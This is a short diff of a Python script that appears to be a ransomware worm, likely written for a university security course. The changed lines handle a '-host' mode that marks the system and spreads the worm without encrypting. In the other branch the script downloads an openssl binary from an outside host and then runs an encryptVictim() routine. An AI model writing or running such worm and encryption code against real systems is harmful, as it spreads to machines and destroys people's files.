@@ -131,9 +131,9 @@ def encryptVictim():
 
 
 markSystem();
-
-if sys.argv[1] == "-host":
-	print("Will mark and spread worm but won't encrypt Documents folder")
+if len(sys.argv) == 2:
+	if sys.argv[1] == "-host":
+		print("Will mark and spread worm but won't encrypt Documents folder")
 else:
 	urllib.urlretrieve("ecs.fullerton.edu/~mgofman/openssl")
 	encryptVictim()
